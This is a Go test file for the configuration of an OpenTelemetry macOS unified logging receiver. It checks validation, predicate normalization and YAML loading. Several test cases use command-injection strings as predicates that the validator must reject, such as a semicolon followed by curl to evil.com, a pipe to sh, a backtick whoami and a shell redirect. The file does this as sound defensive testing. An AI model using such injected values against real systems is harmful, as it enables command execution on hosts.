// Copyright observIQ, Inc.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//      http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

//go:build darwin

package macosunifiedloggingreceiver

import (
	"errors"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/stretchr/testify/require"
	"go.opentelemetry.io/collector/confmap/confmaptest"
)

func TestConfigValidate(t *testing.T) {
	testCases := []struct {
		desc        string
		cfg         *Config
		expectedErr error
	}{
		{
			desc: "valid config - live mode",
			cfg: &Config{
				MaxPollInterval: 50 * time.Second,
				MaxLogAge:       12 * time.Hour,
			},
			expectedErr: nil,
		},
		{
			desc: "invalid archive path - does not exist",
			cfg: &Config{
				ArchivePath: "/tmp/test/invalid",
			},
			expectedErr: errors.New("no such file or directory"),
		},
		{
			desc: "invalid archive path - not a directory",
			cfg: &Config{
				ArchivePath: "./README.md",
			},
			expectedErr: errors.New("must be a directory"),
		},
		{
			desc: "valid predicate with AND",
			cfg: &Config{
				Predicate: "subsystem == 'com.apple.example' AND messageType == 'Error'",
			},
			expectedErr: nil,
		},
		{
			desc: "valid predicate with && (normalized to AND)",
			cfg: &Config{
				Predicate: "subsystem == 'com.apple.example' && messageType == 'Error'",
			},
			expectedErr: nil,
		},
		{
			desc: "valid predicate with || (normalized to OR)",
			cfg: &Config{
				Predicate: "subsystem == 'com.apple.example' || messageType == 'Error'",
			},
			expectedErr: nil,
		},
		{
			desc: "valid predicate with comparison operators",
			cfg: &Config{
				Predicate: "processID > 100 && processID < 1000",
			},
			expectedErr: nil,
		},
		{
			desc: "valid predicate with > comparison and spaces",
			cfg: &Config{
				Predicate: "processID >100",
			},
			expectedErr: nil,
		},
		{
			desc: "invalid predicate - semicolon",
			cfg: &Config{
				Predicate: "subsystem == 'test'; curl http://evil.com",
			},
			expectedErr: errors.New("predicate contains invalid character"),
		},
		{
			desc: "invalid predicate - pipe",
			cfg: &Config{
				Predicate: "subsystem == 'test' | sh",
			},
			expectedErr: errors.New("predicate contains invalid character"),
		},
		{
			desc: "invalid predicate - dollar sign",
			cfg: &Config{
				Predicate: "subsystem == '$HOME'",
			},
			expectedErr: errors.New("predicate contains invalid character"),
		},
		{
			desc: "invalid predicate - backtick",
			cfg: &Config{
				Predicate: "subsystem == '`whoami`'",
			},
			expectedErr: errors.New("predicate contains invalid character"),
		},
		{
			desc: "invalid predicate - append redirect",
			cfg: &Config{
				Predicate: "subsystem == 'test' >> /tmp/output",
			},
			expectedErr: errors.New("predicate contains invalid character"),
		},
	}

	for _, tc := range testCases {
		t.Run(tc.desc, func(t *testing.T) {
			err := tc.cfg.Validate()
			if tc.expectedErr != nil {
				require.ErrorContains(t, err, tc.expectedErr.Error())
			} else {
				require.NoError(t, err)
			}
		})
	}
}

func TestPredicateNormalization(t *testing.T) {
	cfg := &Config{
		Predicate: "subsystem == 'test' && processID > 100 && messageType == 'Error'",
	}

	err := cfg.Validate()
	require.NoError(t, err)

	// Verify && was replaced with AND
	require.Equal(t, "subsystem == 'test' AND processID > 100 AND messageType == 'Error'", cfg.Predicate)
	require.NotContains(t, cfg.Predicate, "&&")
}

func TestLoadConfigFromYAML(t *testing.T) {
	// Create test archive directories for validation
	testdataDir := filepath.Join(".", "testdata")
	systemLogsArchive := filepath.Join(testdataDir, "system_logs.logarchive")
	logsArchive := filepath.Join(testdataDir, "logs.logarchive")

	// Create directories if they don't exist
	_ = os.MkdirAll(systemLogsArchive, 0755)
	_ = os.MkdirAll(logsArchive, 0755)
	defer func() {
		_ = os.RemoveAll(systemLogsArchive)
		_ = os.RemoveAll(logsArchive)
	}()

	testCases := []struct {
		name            string
		configKey       string
		expectedArchive string
		expectedPred    string
		expectedStart   string
		expectedEnd     string
		expectedPoll    time.Duration
		expectedMaxAge  time.Duration
	}{
		{
			name:           "live mode defaults",
			configKey:      "live_mode_defaults",
			expectedPoll:   30 * time.Second,
			expectedMaxAge: 24 * time.Hour,
		},
		{
			name:            "archive mode full",
			configKey:       "archive_mode_full",
			expectedArchive: "./testdata/system_logs.logarchive",
			expectedPred:    "subsystem == 'com.apple.systempreferences'",
			expectedStart:   "2024-01-01 00:00:00",
			expectedEnd:     "2024-01-02 00:00:00",
			expectedPoll:    60 * time.Second,
			expectedMaxAge:  48 * time.Hour,
		},
		{
			name:            "archive mode minimal",
			configKey:       "archive_mode_minimal",
			expectedArchive: "./testdata/logs.logarchive",
			expectedPoll:    0, // Will be set to default in Validate()
			expectedMaxAge:  0,
		},
		{
			name:           "live mode with predicate",
			configKey:      "live_mode_predicate",
			expectedPred:   "process == 'kernel' AND messageType == 'Error'",
			expectedPoll:   15 * time.Second,
			expectedMaxAge: 12 * time.Hour,
		},
		{
			name:            "archive mode time range",
			configKey:       "archive_mode_time_range",
			expectedArchive: "./testdata/system_logs.logarchive",
			expectedStart:   "2024-06-01 00:00:00",
			expectedEnd:     "2024-06-01 23:59:59",
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			// Load the config from YAML file
			cm, err := confmaptest.LoadConf(filepath.Join("testdata", "test_config.yaml"))
			require.NoError(t, err)

			// Get the specific config section
			sub, err := cm.Sub(tc.configKey)
			require.NoError(t, err)

			// Unmarshal into Config struct
			cfg := &Config{}
			err = sub.Unmarshal(cfg)
			require.NoError(t, err)

			// Verify the config values were parsed correctly
			require.Equal(t, tc.expectedArchive, cfg.ArchivePath, "archive_path mismatch")
			require.Equal(t, tc.expectedPred, cfg.Predicate, "predicate mismatch")
			require.Equal(t, tc.expectedStart, cfg.StartTime, "start_time mismatch")
			require.Equal(t, tc.expectedEnd, cfg.EndTime, "end_time mismatch")

			if tc.expectedPoll > 0 {
				require.Equal(t, tc.expectedPoll, cfg.MaxPollInterval, "max_poll_interval mismatch")
			}
			if tc.expectedMaxAge > 0 {
				require.Equal(t, tc.expectedMaxAge, cfg.MaxLogAge, "max_log_age mismatch")
			}

			// Validate the config (should pass for valid configs)
			err = cfg.Validate()
			require.NoError(t, err)
		})
	}
}
